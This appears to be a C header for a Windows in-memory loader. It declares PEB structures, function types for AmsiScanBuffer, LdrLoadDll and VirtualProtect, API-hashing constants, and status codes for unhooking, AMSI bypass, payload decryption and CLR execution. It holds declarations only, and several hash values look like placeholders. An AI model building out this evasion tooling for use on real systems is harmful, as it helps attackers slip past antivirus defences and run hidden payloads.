#pragma once

#include <Windows.h>
#include <amsi.h>


typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    WORD LoadCount;
    WORD TlsIndex;
    union {
        LIST_ENTRY HashLinks;
        struct {
            PVOID SectionPointer;
            ULONG CheckSum;
        };
    };
    union {
        ULONG TimeDateStamp;
        PVOID LoadedImports;
    };
    PVOID EntryPointActivationContext;
    PVOID PatchInformation;
    LIST_ENTRY ForwarderLinks;
    LIST_ENTRY ServiceTagLinks;
    LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;



typedef LONG NTSTATUS;

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)




typedef NTSTATUS(NTAPI* _NtReadVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T BufferSize,
    PSIZE_T NumberOfBytesRead
    );

typedef BOOL(WINAPI* TypeVirtualProtect)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flNewProtect,
    PDWORD lpflOldProtect
    );

typedef NTSTATUS(NTAPI* _LdrLoadDll)(
    PWCHAR PathToFile,
    ULONG Flags,
    PUNICODE_STRING ModuleFileName,
    PHANDLE ModuleHandle
    );

typedef BOOL(WINAPI* TypeCreateProcessW)(
    LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
    );


typedef HRESULT(WINAPI* _AmsiScanBuffer)(
    HAMSICONTEXT amsiContext,
    PVOID buffer,
    ULONG length,
    LPCWSTR contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT* result
    );



// DLL Hashes
#define HASH_KERNEL32    109513359    // kernel32.dll
#define HASH_NTDLL       4097367      // ntdll.dll
#define HASH_AMSI        193491849    // amsi.dll

// API Hashes - Kernel32
#define HASH_CreateProcessW      926060913
#define HASH_VirtualProtect      955026773
#define HASH_VirtualAlloc        874563254
#define HASH_LoadLibraryA        1447063143

// API Hashes - Ntdll (use ULL for large values)
#define HASH_NtReadVirtualMemory 228701921503ULL
#define HASH_LdrLoadDll          11529801
#define HASH_NtAllocateVirtualMemory 1234567890ULL
#define HASH_NtProtectVirtualMemory  987654321ULL

// API Hashes - AMSI
#define HASH_AmsiScanBuffer      1122334455


#ifdef _DEBUG
#define DEBUG_PRINT(fmt, ...) printf("[DEBUG] " fmt "\n", ##__VA_ARGS__)
#else
#define DEBUG_PRINT(fmt, ...) 
#endif



#define MAX_ASSEMBLY_SIZE (50 * 1024 * 1024) 
#define CHUNK_SIZE 1024



#define STATUS_UNHOOK_FAILED     1
#define STATUS_AMSI_BYPASS_FAILED 2
#define STATUS_DECRYPT_FAILED    3
#define STATUS_CLR_LOAD_FAILED   4
#define STATUS_EXECUTION_FAILED  5
